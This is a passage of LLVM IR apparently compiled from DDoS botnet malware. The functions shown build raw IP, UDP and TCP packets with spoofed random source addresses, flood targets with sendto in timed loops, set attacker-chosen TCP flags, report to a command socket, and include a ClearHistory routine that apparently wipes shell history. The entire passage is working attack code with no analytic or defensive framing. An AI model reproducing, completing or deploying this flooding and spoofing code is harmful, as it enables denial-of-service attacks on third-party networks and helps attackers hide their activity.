  %177 = trunc i64 %176 to i32
  call void @makeIPPacket(%struct.iphdr* %167, i32 %170, i32 %173, i8 zeroext 17, i32 %177)
  %178 = load i32, i32* %13, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 8, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #15
  %183 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.2* %184 to %struct.anon.4*
  %186 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %185, i32 0, i32 2
  store i16 %182, i16* %186, align 2
  %187 = call i32 @rand_cmwc()
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.2* %190 to %struct.anon.4*
  %192 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %191, i32 0, i32 0
  store i16 %188, i16* %192, align 2
  %193 = load i32, i32* %10, align 4
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %197

195:                                              ; preds = %156
  %196 = call i32 @rand_cmwc()
  br label %202

197:                                              ; preds = %156
  %198 = load i32, i32* %10, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #15
  %201 = zext i16 %200 to i32
  br label %202

202:                                              ; preds = %197, %195
  %203 = phi i32 [ %196, %195 ], [ %201, %197 ]
  %204 = trunc i32 %203 to i16
  %205 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.2* %206 to %struct.anon.4*
  %208 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %207, i32 0, i32 1
  store i16 %204, i16* %208, align 2
  %209 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.2* %210 to %struct.anon.4*
  %212 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %211, i32 0, i32 3
  store i16 0, i16* %212, align 2
  %213 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %214 = bitcast %struct.udphdr* %213 to i8*
  %215 = getelementptr inbounds i8, i8* %214, i64 8
  %216 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %215, i32 %216)
  %217 = bitcast i8* %161 to i16*
  %218 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 2
  %220 = load i16, i16* %219, align 2
  %221 = zext i16 %220 to i32
  %222 = call zeroext i16 @csum(i16* %217, i32 %221)
  %223 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 7
  store i16 %222, i16* %224, align 2
  %225 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %226 = load i32, i32* %11, align 4
  %227 = add nsw i32 %225, %226
  store i32 %227, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 0, i32* %34, align 4
  br label %228

228:                                              ; preds = %291, %287, %280, %202
  br label %229

229:                                              ; preds = %228
  %230 = load i32, i32* %24, align 4
  %231 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %232 = call i64 @sendto(i32 %230, i8* %161, i64 %159, i32 0, %struct.sockaddr* %231, i32 16)
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.2* %236 to %struct.anon.4*
  %238 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %237, i32 0, i32 0
  store i16 %234, i16* %238, align 2
  %239 = load i32, i32* %10, align 4
  %240 = icmp eq i32 %239, 0
  br i1 %240, label %241, label %243

241:                                              ; preds = %229
  %242 = call i32 @rand_cmwc()
  br label %248

243:                                              ; preds = %229
  %244 = load i32, i32* %10, align 4
  %245 = trunc i32 %244 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #15
  %247 = zext i16 %246 to i32
  br label %248

248:                                              ; preds = %243, %241
  %249 = phi i32 [ %242, %241 ], [ %247, %243 ]
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.2* %252 to %struct.anon.4*
  %254 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %253, i32 0, i32 1
  store i16 %250, i16* %254, align 2
  %255 = call i32 @rand_cmwc()
  %256 = trunc i32 %255 to i16
  %257 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 3
  store i16 %256, i16* %258, align 4
  %259 = load i32, i32* %27, align 4
  %260 = call i32 @GetRandomIP(i32 %259)
  %261 = call i32 @htonl(i32 %260) #15
  %262 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 8
  store i32 %261, i32* %263, align 4
  %264 = bitcast i8* %161 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* %264, i32 %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = load i32, i32* %33, align 4
  %273 = load i32, i32* %18, align 4
  %274 = icmp eq i32 %272, %273
  br i1 %274, label %275, label %281

275:                                              ; preds = %248
  %276 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %277 = load i32, i32* %32, align 4
  %278 = icmp sgt i32 %276, %277
  br i1 %278, label %279, label %280

279:                                              ; preds = %275
  br label %294

280:                                              ; preds = %275
  store i32 0, i32* %33, align 4
  br label %228

281:                                              ; preds = %248
  %282 = load i32, i32* %33, align 4
  %283 = add i32 %282, 1
  store i32 %283, i32* %33, align 4
  %284 = load i32, i32* %34, align 4
  %285 = load i32, i32* %15, align 4
  %286 = icmp eq i32 %284, %285
  br i1 %286, label %287, label %291

287:                                              ; preds = %281
  %288 = load i32, i32* %16, align 4
  %289 = mul nsw i32 %288, 1000
  %290 = call i32 @usleep(i32 %289)
  store i32 0, i32* %34, align 4
  br label %228

291:                                              ; preds = %281
  %292 = load i32, i32* %34, align 4
  %293 = add i32 %292, 1
  store i32 %293, i32* %34, align 4
  br label %228

294:                                              ; preds = %279
  %295 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %295)
  br label %296

296:                                              ; preds = %52, %63, %73, %125, %133, %294, %120
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

declare i32 @usleep(i32) #5

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendTCP(i8* %0, i32 %1, i32 %2, i32 %3, i8* %4, i32 %5, i32 %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %340

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %340

55:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #12
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i64 0, i64 0))
  br label %340

63:                                               ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

73:                                               ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  store i64 %76, i64* %21, align 8
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %22, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %23, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @GetRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #15
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

120:                                              ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

156:                                              ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %158, i8** %24, align 8
  br label %159

159:                                              ; preds = %230, %156
  %160 = load i8*, i8** %24, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

162:                                              ; preds = %159
  %163 = load i8*, i8** %24, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i64 0, i64 0)) #11
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

166:                                              ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

174:                                              ; preds = %162
  %175 = load i8*, i8** %24, align 8
  %176 = call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i64 0, i64 0)) #11
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

178:                                              ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

186:                                              ; preds = %174
  %187 = load i8*, i8** %24, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i64 0, i64 0)) #11
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

190:                                              ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

198:                                              ; preds = %186
  %199 = load i8*, i8** %24, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i64 0, i64 0)) #11
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

202:                                              ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

210:                                              ; preds = %198
  %211 = load i8*, i8** %24, align 8
  %212 = call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

214:                                              ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon* %216 to %struct.anon.0*
  %218 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

222:                                              ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %24, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 %223, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i64 0, i64 0), i8* %224)
  br label %226

226:                                              ; preds = %222, %214
  br label %227

227:                                              ; preds = %226, %202
  br label %228

228:                                              ; preds = %227, %190
  br label %229

229:                                              ; preds = %228, %178
  br label %230

230:                                              ; preds = %229, %166
  %231 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %231, i8** %24, align 8
  br label %159, !llvm.loop !35

232:                                              ; preds = %159
  br label %233

233:                                              ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

250:                                              ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

252:                                              ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #15
  %256 = zext i16 %255 to i32
  br label %257

257:                                              ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* %264, %struct.tcphdr* %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* %271, i32 %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %280 = load i32, i32* %10, align 4
  %281 = add nsw i32 %279, %280
  store i32 %281, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %282

282:                                              ; preds = %335, %334, %257
  br label %283

283:                                              ; preds = %282
  %284 = load i32, i32* %17, align 4
  %285 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %286 = call i64 @sendto(i32 %284, i8* %78, i64 %76, i32 0, %struct.sockaddr* %285, i32 16)
  %287 = load i32, i32* %19, align 4
  %288 = call i32 @GetRandomIP(i32 %287)
  %289 = call i32 @htonl(i32 %288) #15
  %290 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  store i32 %289, i32* %291, align 4
  %292 = call i32 @rand_cmwc()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 2
  store i32 %296, i32* %300, align 4
  %301 = call i32 @rand_cmwc()
  %302 = trunc i32 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 0
  store i16 %302, i16* %306, align 4
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 6
  store i16 0, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %312 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %313 = call zeroext i16 @tcpcsum(%struct.iphdr* %311, %struct.tcphdr* %312)
  %314 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 6
  store i16 %313, i16* %317, align 4
  %318 = bitcast i8* %78 to i16*
  %319 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  %321 = load i16, i16* %320, align 2
  %322 = zext i16 %321 to i32
  %323 = call zeroext i16 @csum(i16* %318, i32 %322)
  %324 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 7
  store i16 %323, i16* %325, align 2
  %326 = load i32, i32* %26, align 4
  %327 = load i32, i32* %15, align 4
  %328 = icmp eq i32 %326, %327
  br i1 %328, label %329, label %335

329:                                              ; preds = %283
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %331 = load i32, i32* %25, align 4
  %332 = icmp sgt i32 %330, %331
  br i1 %332, label %333, label %334

333:                                              ; preds = %329
  br label %338

334:                                              ; preds = %329
  store i32 0, i32* %26, align 4
  br label %282

335:                                              ; preds = %283
  %336 = load i32, i32* %26, align 4
  %337 = add i32 %336, 1
  store i32 %337, i32* %26, align 4
  br label %282

338:                                              ; preds = %333
  %339 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %339)
  br label %340

340:                                              ; preds = %338, %60, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i64 0, i64 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i64 0, i64 0))
  ret void
}

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHTTP(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
